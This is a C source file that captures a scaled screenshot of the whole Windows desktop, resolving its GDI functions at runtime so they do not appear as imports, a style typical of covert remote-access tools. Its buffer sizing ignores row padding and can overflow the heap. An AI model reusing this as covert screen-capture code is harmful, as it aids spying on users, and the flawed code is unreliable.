#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "types.h"
#include "screenshot.h"
#include "loadLibrary.h"

HDC snc_backBuff;
HMODULE snc_lib;
__SelectObject snc_SelectObject;
__CreateCompatibleDC snc_CreateCompatibleDC;
__CreateCompatibleBitmap snc_CreateCompatibleBitmap;
__SetStretchBltMode snc_SetStretchBltMode;
__StretchBlt snc_StretchBlt;
__GetDIBits snc_GetDIBits;
__DeleteObject snc_DeleteObject;
__DeleteDC snc_DeleteDC;

void screenshot_Init(void)
{
	snc_lib = loadLibrary_Load(lib_Gdi32);
	snc_backBuff = GetDC(GetDesktopWindow());

	if(snc_lib)
	{
		snc_SelectObject = (__SelectObject)loadLibrary_LoadFunc(snc_lib, lib_SelectObject);
		snc_CreateCompatibleDC = (__CreateCompatibleDC)loadLibrary_LoadFunc(snc_lib, lib_CreateCompatibleDC);
		snc_CreateCompatibleBitmap = (__CreateCompatibleBitmap)loadLibrary_LoadFunc(snc_lib, lib_CreateCompatibleBitmap);
		snc_SetStretchBltMode = (__SetStretchBltMode)loadLibrary_LoadFunc(snc_lib, lib_SetStretchBltMode);
		snc_StretchBlt = (__StretchBlt)loadLibrary_LoadFunc(snc_lib, lib_StretchBlt);
		snc_GetDIBits = (__GetDIBits)loadLibrary_LoadFunc(snc_lib, lib_GetDIBits);
		snc_DeleteObject = (__DeleteObject)loadLibrary_LoadFunc(snc_lib, lib_DeleteObject);
		snc_DeleteDC = (__DeleteDC)loadLibrary_LoadFunc(snc_lib, lib_DeleteDC);
	}
}

uint32 screenshot_Calculate(OUT_UINT scW, OUT_UINT scH, uint32 perW, uint32 perH)
{
	if(!snc_backBuff || !snc_lib)
	{
		return 0;
	}

	if(perW < 1 || perH < 1)
	{
		if(perW < 1)
		{
			perW = 100;
		}

		if(perH < 1)
		{
			perH = 100;
		}
	}

	if(perW > 100 || perH > 100)
	{
		if(perW > 100)
		{
			perW = 100;
		}
	
		if(perH > 100)
		{
			perH = 100;
		}
	}

	int _w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	int _h = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	if(!_w || !_h)
	{
		return 0;
	}

	*scW = (int)((double)_w * ((double)perW / 100.0));
	*scH = (int)((double)_h * ((double)perH / 100.0));

	return *scW * *scH * 3;
}

uint32 screenshot_Take(uint32 perW, uint32 perH, OUT_USTRP data)
{
	if(!snc_backBuff || !snc_lib)
	{
		return 0;
	}
	
	uint32 scW;
	uint32 scH;
	uint32 size;

	if(!(size = screenshot_Calculate(&scW, &scH, perW, perH)))
	{
		return 0;
	}

	uint32 orgW = GetSystemMetrics(SM_CXVIRTUALSCREEN);
	uint32 orgH = GetSystemMetrics(SM_CYVIRTUALSCREEN);

	HDC frontBuff = snc_CreateCompatibleDC(snc_backBuff);
	HBITMAP backBM = snc_CreateCompatibleBitmap(snc_backBuff, scW, scH);
	HBITMAP oldBackBM = (HBITMAP)snc_SelectObject(frontBuff, backBM);
	
	if(!snc_SetStretchBltMode(frontBuff, HALFTONE))
	{
		snc_DeleteObject(backBM);
		snc_DeleteObject(oldBackBM);
		snc_DeleteDC(frontBuff);

		return 0;
	}
	
	if(!snc_StretchBlt(frontBuff, 0, 0, scW, scH, snc_backBuff, 0, 0, orgW, orgH, SRCCOPY))
	{
		snc_DeleteObject(backBM);
		snc_DeleteObject(oldBackBM);
		snc_DeleteDC(frontBuff);
		
		return 0;
	}

	BITMAPINFOHEADER bmpInfoHeader = { sizeof(BITMAPINFOHEADER) };
	bmpInfoHeader.biWidth = scW;
	bmpInfoHeader.biHeight = scH;
	bmpInfoHeader.biPlanes = 1;
	bmpInfoHeader.biBitCount = 24;

	uint8* rdata = malloc(size + 1);
	memset(rdata, 0, size + 1);

	int rv = snc_GetDIBits(snc_backBuff, backBM, 0, scH, rdata, (BITMAPINFO*)&bmpInfoHeader, DIB_RGB_COLORS);

	snc_DeleteObject(backBM);
	snc_DeleteObject(oldBackBM);
	snc_DeleteDC(frontBuff);

	if(rv != scH)
	{
		free(rdata);

		return 0;
	}

	*data = rdata;

	return size;
}